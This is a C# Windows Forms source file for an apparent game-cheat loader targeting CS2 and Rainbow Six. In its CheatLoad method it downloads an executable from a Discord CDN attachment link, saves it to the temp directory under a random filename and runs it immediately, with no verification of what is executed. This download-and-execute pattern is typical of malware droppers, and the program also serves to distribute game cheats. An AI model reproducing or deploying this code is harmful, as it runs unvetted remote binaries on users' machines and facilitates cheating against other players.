using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System;
using System.IO;
using System.Diagnostics;


namespace Project_X
{
    public partial class Form2 : Form
    {
        int CheatSelection;


        public Form2()
        {
            InitializeComponent();
        }


        private void button1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }


        private void button2_Click(object sender, EventArgs e)
        {
            CheatLoad(CheatSelection);
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            CS2color();
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            R6color();
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            CS2color();
        }

        private void label1_Click(object sender, EventArgs e)
        {
            CS2color();
        }

        private void label2_Click(object sender, EventArgs e)
        {
            CS2color();
        }

        private void pictureBox3_Click(object sender, EventArgs e)
        {
            CS2color();
        }

        private void label3_Click(object sender, EventArgs e)
        {
            R6color();
        }

        private void label4_Click(object sender, EventArgs e)
        {
            R6color();
        }

        private void pictureBox4_Click(object sender, EventArgs e)
        {
            R6color();
        }

     

        private void CS2color()
        {
            CheatSelection = 1;
            label1.ForeColor = Color.FromArgb(123, 194, 21);
            label1.BackColor = Color.FromArgb(26, 26, 26);
            label2.BackColor = Color.FromArgb(26, 26, 26);

            label3.ForeColor = Color.FromArgb(194, 194, 194);
            label3.BackColor = Color.FromArgb(35, 35, 35);
            label4.BackColor = Color.FromArgb(35, 35, 35);

            pictureBox1.BackColor = Color.FromArgb(26, 26, 26);
            pictureBox2.BackColor = Color.FromArgb(35, 35, 35);
        }
        private void R6color()
        {
            CheatSelection = 2;
            label1.ForeColor = Color.FromArgb(194, 194, 194);
            label1.BackColor = Color.FromArgb(35, 35, 35);
            label2.BackColor = Color.FromArgb(35, 35, 35);

            label3.ForeColor = Color.FromArgb(123, 194, 21);
            label3.BackColor = Color.FromArgb(26, 26, 26);
            label4.BackColor = Color.FromArgb(26, 26, 26);

            pictureBox1.BackColor = Color.FromArgb(35, 35, 35);
            pictureBox2.BackColor = Color.FromArgb(26, 26, 26);
        }

        private void CheatLoad(int number)
        {
            string path = null;

            if (number == 1)
            {
                path = DownloadFile("https://cdn.discordapp.com/attachments/1111291225400676432/1245900536075780167/mid.exe?ex=665a6ecb&is=66591d4b&hm=e6c437062ea8e6b9582b6c4643858e991d144e314efd4fba7e17e7988e7ac1a5&");
            }
            else if (number == 2)
            {

                path = DownloadFile("https://cdn.discordapp.com/attachments/1111291225400676432/1241492599596912711/Loader.exe?ex=664f02d5&is=664db155&hm=e2463527d346cdaef0530b40621b7bfb7e076d272fa9a811e8d9067a7f757beb&");
            }
            if (path != null)
            {
                Process.Start(path);
            }
            else
            {
                MessageBox.Show("Fatal error.." + path);
            }

            this.Hide();
            Form3 frm = new Form3(path, number);
            frm.Show();
        }

        public string DownloadFile(string url)
        {
            using (WebClient client = new WebClient())
            {
                    string randomFilename = Guid.NewGuid().ToString() + ".exe"; // Generate a random filename
                    string fullPath = Path.Combine(Path.GetTempPath(), randomFilename); // Combine with the temporary directory

                    client.DownloadFile(url, fullPath); // Download the file to the temporary directory

                    return fullPath; // Return the full path to the downloaded file
            }
        }
    }
}
